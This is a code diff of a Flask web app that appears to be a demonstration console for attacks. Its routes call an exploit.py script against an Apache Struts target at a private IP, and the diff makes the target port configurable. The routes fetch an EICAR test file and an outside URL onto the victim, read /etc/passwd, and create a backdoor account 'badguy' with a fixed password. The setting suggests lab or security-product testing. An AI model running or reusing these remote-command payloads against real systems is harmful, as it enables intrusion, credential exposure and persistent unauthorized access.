@@ -11,6 +11,7 @@ import subprocess
 ###################################################################################
 
 victim_host = "192.168.152.205"
+struts_port = "8080"
 
 main_blueprint = Blueprint(
     'main',
@@ -19,7 +20,11 @@ main_blueprint = Blueprint(
 )
 
 def format_output(output):
-    return str(output)
+    print(type(output))
+    if (isinstance(output, str)):
+        return output
+    else:
+        return str(output.decode("utf-8"))
 
 @main_blueprint.route('/')
 def home():
@@ -54,7 +59,7 @@ def ping_target():
 def struts_eicar():
     #output = "fake output"
     try:
-        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), "wget http://www.eicar.org/download/eicar.com -O /tmp/eicar.com"])
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), "wget http://www.eicar.org/download/eicar.com -O /tmp/eicar.com"])
         flash("The command ran successfully", category="success")
     except subprocess.CalledProcessError as e:
         flash("An error occurred", category="danger")
@@ -66,7 +71,7 @@ def struts_eicar():
 def struts_eicar_https():
     #output = "fake output"
     try:
-        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), "apk add --update openssl; wget https://secure.eicar.org/eicar.com -O /tmp/eicar.com"])
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), "apk add --update openssl; wget https://secure.eicar.org/eicar.com -O /tmp/eicar.com"])
         flash("The command ran successfully", category="success")
     except subprocess.CalledProcessError as e:
         flash("An error occurred", category="danger")
@@ -78,7 +83,7 @@ def struts_eicar_https():
 def struts_mal_url():
     #output = "fake output"
     try:
-        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), "wget http://wrs21.winshipway.com -O index.html"])
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), "wget http://wrs21.winshipway.com -O index.html"])
         flash("The command ran successfully", category="success")
     except subprocess.CalledProcessError as e:
         flash("An error occurred", category="danger")
@@ -91,7 +96,7 @@ def struts_mal_url():
 def struts_list_users():
     #output = "fake output"
     try:
-        target = "http://{victim_host}:8081/hello".format(victim_host=victim_host)
+        target = "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port)
         output = subprocess.check_output(["/usr/bin/python", "exploit.py", target, "cat /etc/passwd"])
         flash("The command ran successfully", category="success")
     except subprocess.CalledProcessError as e:
@@ -105,7 +110,7 @@ def struts_list_users():
 def struts_create_user():
     #output = "fake output"
     try:
-        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:8081/hello".format(victim_host=victim_host), 'adduser -D badguy; echo "badguy:newpass" | chpasswd'])
+        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), 'adduser -D badguy; echo "badguy:newpass" | chpasswd'])
         flash("The command ran successfully", category="success")
     except subprocess.CalledProcessError as e:
         flash("An error occurred", category="danger")
